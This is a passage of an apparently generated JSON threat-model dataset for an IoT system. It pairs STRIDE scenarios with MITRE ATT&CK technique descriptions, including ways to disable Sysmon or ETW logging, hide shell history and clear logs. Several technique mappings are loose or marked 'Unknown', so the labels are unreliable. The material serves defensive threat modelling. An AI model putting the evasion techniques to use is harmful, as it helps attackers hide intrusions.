such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates sensor data streams to cause the system to make incorrect decisions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access to intercept and alter sensor data.",
                    "Role": "Attacker",
                    "Condition": "Provides unauthorized network access through weak security measures."
                },
                {
                    "Assumption": "The IoT system lacks encryption for data in transit.",
                    "Role": "System Administrator",
                    "Condition": "Communications between sensors and system lack encryption."
                },
                {
                    "Assumption": "Sensor data integrity checks are either absent or ineffective.",
                    "Role": "Software Developer",
                    "Condition": "System does not verify integrity or authenticate data sources."
                }
            ],
            "Potential Impact": "Corruption of data and poor decision-making by IoT system.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "sensor data",
                "data integrity",
                "network access"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "id": "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
                "technique_id": "T1054"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker physically tampering with actuators to disrupt their operation.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the environment housing the actuators.",
                    "Role": "Attacker",
                    "Condition": "Gains entry through physical security breaches."
                },
                {
                    "Assumption": "Actuators are not tamper-resistant or monitored for physical changes.",
                    "Role": "Hardware Engineer",
                    "Condition": "Lack of tamper-detection mechanisms."
                },
                {
                    "Assumption": "No consistent physical security checks on IoT devices.",
                    "Role": "Security Staff",
                    "Condition": "Insufficient physical security protocols."
                }
            ],
            "Potential Impact": "Disruption of physical operations and possible safety risks.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "actuators",
                "physical security",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious alterations to AI and Machine Learning model parameters to influence system behavior.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the AI/ML model repositories.",
                    "Role": "Attacker",
                    "Condition": "Access provided by compromised credentials or insider threat."
                },
                {
                    "Assumption": "There is no encryption and integrity verification for model data.",
                    "Role": "System Administrator",
                    "Condition": "Model files transported and stored unencrypted."
                },
                {
                    "Assumption": "The development and deployment pipelines lack security controls.",
                    "Role": "DevOps Engineer",
                    "Condition": "Inadequate DevSecOps practices."
                }
            ],
            "Potential Impact": "Bias and errors in system decision-making, leading to operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "AI/ML models",
                "parameter manipulation",
                "deployment security"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies making specific changes to environment settings via the user devices.",
            "Assumptions": [
                {
                    "Assumption": "There are no adequate logs of user activities.",
                    "Role": "System Administrator",
                    "Condition": "Audit logs are either insufficient or non-existent."
                },
                {
                    "Assumption": "User devices are not securely authenticated.",
                    "Role": "System Administrator",
                    "Condition": "Weak authentication mechanisms in place."
                },
                {
                    "Assumption": "Changes to environment settings are not properly recorded and flagged.",
                    "Role": "Software Developer",
                    "Condition": "The system lacks proper change management."
                }
            ],
            "Potential Impact": "Discrepancies in system configuration and potential unauthorized modifications.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user activity",
                "logging",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies receiving control access after compromising a smart card.",
            "Assumptions": [
                {
                    "Assumption": "Smart card activity is not logged efficiently.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate logging infrastructure."
                },
                {
                    "Assumption": "There is no user notification mechanism after access.",
                    "Role": "User Experience Designer",
                    "Condition": "Lack of immediate access notifications to the card owner."
                },
                {
                    "Assumption": "Ambient IoT system lacks user session tracking.",
                    "Role": "Software Developer",
                    "Condition": "Implementation misses session recording functionality."
                }
            ],
            "Potential Impact": "Difficulty in tracing unauthorized access and proving malicious activity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "smart card",
                "access denial",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user denies sending commands through the communication infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Communication logs are incomplete or tampered.",
                    "Role": "System Administrator",
                    "Condition": "Logs can be altered or are not properly maintained."
                },
                {
                    "Assumption": "No multi-factor authentication for sending sensitive commands.",
                    "Role": "System Administrator",
                    "Condition": "Single-layer command approval mechanism."
                },
                {
                    "Assumption": "The system does not utilize secure communication channels.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of TLS or other encryption measures."
                }
            ],
            "Potential Impact": "Inability to trace command origination leading to potential system abuse.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "communication infrastructure",
                "commands",
                "logging"
            ],
            "mitre_technique": {
                "name": "HISTCONTROL",
                "description": "The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
                "id": "attack-pattern--086952c4-5b90-4185-b573-02bad8e11953",
                "technique_id": "T1148"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of unencrypted biometric data being transmitted from sensors to central systems.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data is transmitted unencrypted.",
                    "Role": "System Administrator",
                    "Condition": "Data transmission lacks encryption protocols."
                },
                {
                    "Assumption": "Network channel susceptible to eavesdropping.",
                    "Role": "Network Engineer",
                    "Condition": "Insecure network configurations."
                },
                {
                    "Assumption": "Monitoring solutions do not detect data interception.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of robust network monitoring tools."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive biometric information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "biometric data",
                "unencrypted transmission",
                "eavesdropping"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--e102d6e0-3c41-4f7d-85bf-4f36bb9fbe7c",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to data repositories containing user profiles and historical data.",
            "Assumptions": [
                {
                    "Assumption": "Access controls on databases are insufficient.",
                    "Role": "Database Administrator",
                    "Condition": "Weak or non-existent access policies."
                },
                {
                    "Assumption": "User profiles and historical data are stored unencrypted.",
                    "Role": "Database Administrator",
                    "Condition": "Data at rest is not encrypted."
                },
                {
                    "Assumption": "Lack of regular access review and audit.",
                    "Role": "Security Manager",
                    "Condition": "Absent or infrequent access rights auditing."
                }
            ],
            "Potential Impact": "Exposure of sensitive user information and historical usage patterns.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data repositories",
                "access control",
                "user profiles"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malicious actor exploiting vulnerabilities to extract data from AI/ML model outputs.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML models reveal sensitive information in their outputs.",
                    "Role": "Machine Learning Engineer",
                    "Condition": "Poorly generalized or overfitting models."
                },
                {
                    "Assumption": "Access to AI/ML models is not adequately restricted.",
                    "Role": "System Administrator",
                    "Condition": "Weak access policies to model resources."
                },
                {
                    "Assumption": "No detection mechanisms for abnormal model queries.",
                    "Role": "Data Scientist",
                    "Condition": "Anomaly detection is missing from model interaction overview."
                }
            ],
            "Potential Impact": "Extraction of sensitive data deduced from model predictions.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "AI/ML models",
                "data extraction",
                "model vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack targeting the communication infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Communications lack distributed redundancy.",
                    "Role": "Network Architect",
                    "Condition": "Single point of failure in network design."
                },
                {
                    "Assumption": "DDoS mitigation strategies are not implemented.",
                    "Role": "Network Engineer",
                    "Condition": "Insufficient DDoS protection measures."
                },
                {
                    "Assumption": "Attacker has access to a botnet or other means for launching large-scale attacks.",
                    "Role": "Attacker",
                    "Condition": "Organization targeted by adversaries with substantial resources."
                }
            ],
            "Potential Impact": "Disruption of system communications and overall service availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "communication infrastructure",
                "attack vector"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious software causing resource exhaustion on the user devices resulting in unresponsiveness.",
            "Assumptions": [
                {
                    "Assumption": "User devices are vulnerable to malware.",
                    "Role": "User",
                    "Condition": "Devices lack proper malware protections."
                },
                {
                    "Assumption": "Malicious software evades existing security measures.",
                    "Role": "Attacker",
                    "Condition": "Advanced malware tactics not addressed by current defenses."
                },
                {
                    "Assumption": "Automated patching mechanisms are not in place to address vulnerabilities quickly.",
                    "Role": "System Administrator",
                    "Condition": "Manual update and patch processes."
                }
            ],
            "Potential Impact": "Unavailability of user interaction, resulting in degraded system usability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "resource exhaustion",
                "user device"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the data repositories with extensive write requests, causing the system to slow down or crash.",
            "Assumptions": [
                {
                    "Assumption": "Data repositories are not protected against untrusted or malformed data.",
                    "Role": "Database Administrator",
                    "Condition": "Lack of input validation and data limits."
                },
                {
                    "Assumption": "System operation allows high-volume data writes without checks.",
                    "Role": "System Administrator",
                    "Condition": "Absence of rate limiting and data integrity checks."
                },
                {
                    "Assumption": "Database monitoring and alerting are not adequately configured.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient alerting mechanisms for abnormal database activity."
                }
            ],
            "Potential Impact": "Significant reduction in system performance and potential unavailability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data repository",
                "write requests",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker escalates privileges by exploiting vulnerabilities in the AI/ML models' deployment environment.",
            "Assumptions": [
                {
                    "Assumption": "Deployment environment has vulnerabilities that can be exploited.",
                    "Role": "DevOps Engineer",
                    "Condition": "Unpatched or misconfigured deployment systems."
                },
                {
                    "Assumption": "Attacker has access to the deployment environment.",
                    "Role": "Attacker",
                    "Condition": "Access through compromised credentials or insider threat."
                },
                {
                    "Assumption": "There are no proper privilege escalation protections.",
                    "Role": "System Administrator",
                    "Condition": "Lack of robust RBAC (Role-Based Access Control) and IAM (Identity and Access Management) policies."
                }
            ],
            "Potential Impact": "Unauthorized access to high-level controls and sensitive system areas.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "AI/ML models",
                "vulnerabilities",
                "access control"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An external attacker gaining high-level access by exploiting insecure endpoints in the communication infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Communication infrastructure endpoints are insecure.",
                    "Role": "Network Engineer",
                    "Condition": "Endpoints lack necessary security measures."
                },
                {
                    "Assumption": "Attacker knowledge of endpoint vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Information about insecure endpoints is available."
                },
                {
                    "Assumption": "No effective endpoint hardening practices are in place.",
                    "Role": "Security Engineer",
                    "Condition": "Endpoints are not regularly monitored and updated."
                }
            ],
            "Potential Impact": "Unauthorized access, causing system and data compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "communication infrastructure",
                "endpoints",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider using legitimate access to perform unauthorized administrative actions.",
            "Assumptions": [
                {
                    "Assumption": "The insider has been granted high-level access for regular job responsibilities.",
                    "Role": "Insider",
                    "Condition": "High-level access roles often needed for job duties."
                },
                {
                    "Assumption": "There is a lack of monitoring of insider activities.",
                    "Role": "Security Manager",
                    "Condition": "Inadequate monitoring and alerting for privileged user actions."
                },
                {
                    "Assumption": "Privilege separation policies are not adequately enforced.",
                    "Role": "System Administrator",
                    "Condition": "No separation of duties."
                }
            ],
            "Potential Impact": "System misuse leading to unauthorized rule setting and data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "administrative actions",
                "access control"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "26",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a legitimate user by stealing biometric data through a compromised sensor.",
            "Assumptions": [
                {
                    "Assumption": "Attackers can access and compromise biometric sensors.",
                    "Role": "Attacker",
                    "Condition": "Sensor lacks proper security controls."
                },
                {
                    "Assumption": "Biometric data is not encrypted during transmission.",
                    "Role": "System Architect",
                    "Condition": "System design flaw or oversight."
                },
                {
                    "Assumption": "No continuous authentication mechanism is in place.",
                    "Role": "Security Engineer",
                    "Condition": "Authentication is not periodically re-verified."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system controls.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometric",
                "sensor",
                "data steal"
            ],
            "mitre_technique": {
                "name": "Phishing for Information",
                "description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as 